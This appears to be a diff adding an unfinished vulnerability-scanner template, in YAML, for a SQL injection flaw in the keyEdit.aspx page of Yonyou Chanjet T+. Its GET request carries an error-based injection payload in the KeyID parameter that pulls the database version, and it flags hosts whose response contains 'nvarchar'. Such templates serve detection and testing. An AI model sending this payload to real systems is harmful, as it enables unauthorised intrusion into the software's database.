@@ -1,0 +1,21 @@
+id:
+
+info:
+  name: 用友畅捷通TPlus keyEdit.aspx接SQL注入漏洞
+  severity:
+  description:
+  details:
+  repair:
+requests1:
+  method: GET
+  path: /tplus/UFAQD/keyEdit.aspx?KeyID=1%27%20and%201=(select%20@@version)%20--&preload=1
+  headers:
+    Accept-Encoding: gzip, deflate
+    Connection: close
+    Accept-Charset: utf-8
+response1:
+  headers:
+  body: nvarchar
+  code:
+requests2:
+response2:
